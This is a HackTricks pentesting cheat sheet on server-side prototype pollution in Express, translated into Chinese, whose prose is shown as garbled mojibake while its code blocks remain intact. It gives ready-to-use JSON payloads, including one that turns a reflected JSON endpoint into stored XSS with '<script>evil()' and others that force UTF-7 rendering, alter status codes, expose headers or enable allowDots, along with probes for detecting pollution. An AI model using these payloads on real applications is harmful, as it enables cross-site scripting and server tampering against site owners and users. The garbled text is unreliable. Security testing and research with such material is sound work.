# ExpressåŸå‹æ±¡æŸ“å·¥å…·

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## æä¾›XSSå“åº”

### å°†JSONå†…å®¹ç±»å‹æ›´æ”¹ä¸ºHTML

åœ¨ä½¿ç”¨**JSONå†…å®¹ç±»å‹å“åº”**å¹¶åå°„JSONçš„Expressåº”ç”¨ä¸­ï¼š
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œé€šå¸¸æ— æ³•é€šè¿‡JSONå†…å®¹ç±»å‹è¿›è¡ŒXSSæ”»å‡»ã€‚ç„¶è€Œï¼Œé€šè¿‡åŸå‹æ±¡æŸ“ï¼Œæˆ‘ä»¬å¯ä»¥**æ··æ·†Expressä»¥æä¾›HTMLå“åº”**ã€‚æ­¤æ¼æ´ä¾èµ–äºåº”ç”¨ç¨‹åºä½¿ç”¨**`res.send(obj)`**å¹¶ä½¿ç”¨åº”ç”¨ç¨‹åº/jsonå†…å®¹ç±»å‹çš„bodyè§£æå™¨ã€‚
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
é€šè¿‡æ±¡æŸ“`body`å’Œ`_body`å±æ€§ï¼Œå¯ä»¥å¯¼è‡´Expressæä¾›HTMLå†…å®¹ç±»å‹å¹¶åå°„`_body`å±æ€§ï¼Œä»è€Œå¯¼è‡´å­˜å‚¨å‹XSSã€‚

### æ¸²æŸ“UTF7

å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä½¿Expressæ¸²æŸ“UTF-7å†…å®¹ï¼š
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## å®‰å…¨æ‰«ææŠ€å·§

### JSONç©ºæ ¼

ä»¥ä¸‹çš„PPå°†ä½¿JSONä¸­çš„å±æ€§å¤šå‡ºä¸€ä¸ªç©ºæ ¼ï¼Œè€Œä¸ä¼šç ´ååŠŸèƒ½ï¼š
```json
{"__proto__":{"json spaces": " "}}
```
ç„¶åä¸€ä¸ªåå°„çš„JSONå°†ä¼šæ˜¯è¿™æ ·çš„ï¼š
```json
{"foo":  "bar"} -- Note the extra space
```
### æš´éœ²çš„å¤´éƒ¨ä¿¡æ¯

ä»¥ä¸‹çš„PP gadgetå°†ä¼šä½¿æœåŠ¡å™¨è¿”å›HTTPå¤´éƒ¨ä¿¡æ¯ï¼š**`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
éœ€è¦å®‰è£…**CORSæ¨¡å—**

### **OPTIONSæ–¹æ³•**

ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼Œå¯ä»¥**éšè—OPTIONSå“åº”ä¸­çš„ä¸€ä¸ªæ–¹æ³•**ï¼š
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **çŠ¶æ€**

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹PPè´Ÿè½½æ›´æ”¹**è¿”å›çš„çŠ¶æ€ç **ï¼š
```json
{"__proto__":{"status":510}}
```
### é”™è¯¯

å½“ä½ ä½¿ç”¨åŸå§‹ç±»å‹ï¼ˆå¦‚å­—ç¬¦ä¸²ï¼‰ç»™åŸå‹èµ‹å€¼æ—¶ï¼Œå®ƒä¼šäº§ç”Ÿä¸€ä¸ª**æ— æ“ä½œï¼ˆno-opï¼‰æ“ä½œï¼Œå› ä¸ºåŸå‹å¿…é¡»æ˜¯ä¸€ä¸ªå¯¹è±¡**ã€‚å¦‚æœä½ å°è¯•å°†åŸå‹å¯¹è±¡åˆ†é…ç»™`Object.prototype`æœ¬èº«ï¼Œè¿™å°†**æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸**ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ç§è¡Œä¸ºæ¥**æ£€æµ‹åŸå‹æ±¡æŸ“æ˜¯å¦æˆåŠŸ**ï¼š
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### åå°„çš„å€¼

å¦‚æœåº”ç”¨ç¨‹åºåœ¨å“åº”ä¸­åæ˜ äº†ä¸€ä¸ªå¯¹è±¡ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰**å¥‡æ€ªåç§°å’Œ`__proto__`çš„å±æ€§**ï¼Œå¦‚æœ**åªæœ‰å¥‡æ€ªçš„å±æ€§è¢«åå°„**ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨Webæ¼æ´ï¼š
```json
{"hacktricks":"rocks","__proto__":"test"}
```
æˆ–è€…å¦‚æœä½¿ç”¨äº†Lodashæˆ–ç±»ä¼¼çš„åº“ï¼Œä½ å¯ä»¥é€šè¿‡PPåœ¨å¯¹è±¡å†…éƒ¨**è®¾ç½®ä¸€ä¸ªå±æ€§**ï¼Œå¦‚æœè¯¥å±æ€§æ²¡æœ‰åæ˜ å‡ºæ¥ï¼Œé‚£æ˜¯å› ä¸ºLodashä¼šæŸ¥çœ‹å½“å‰å¯¹è±¡ï¼Œä»¥ç¡®å®šè¯¥å±æ€§æ˜¯å¦å·²å­˜åœ¨äºåˆå¹¶çš„å¯¹è±¡ä¸­ï¼š
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## æ‚é¡¹

### å…è®¸ç‚¹å·

åœ¨Expressä¸­æœ‰ä¸€ä¸ªé€‰é¡¹å¯ä»¥å…è®¸ä½ ä»æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°ä¸­**åˆ›å»ºå¯¹è±¡**ã€‚\
ä½ å¯ä»¥åœ¨ä¸€ä¸ªæ¼æ´**é“¾**ä¸­åˆ©ç”¨å®ƒæ¥åˆ©ç”¨**åŸå‹æ±¡æŸ“æ¼æ´**ã€‚
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` åœ¨Nodeä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚**

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
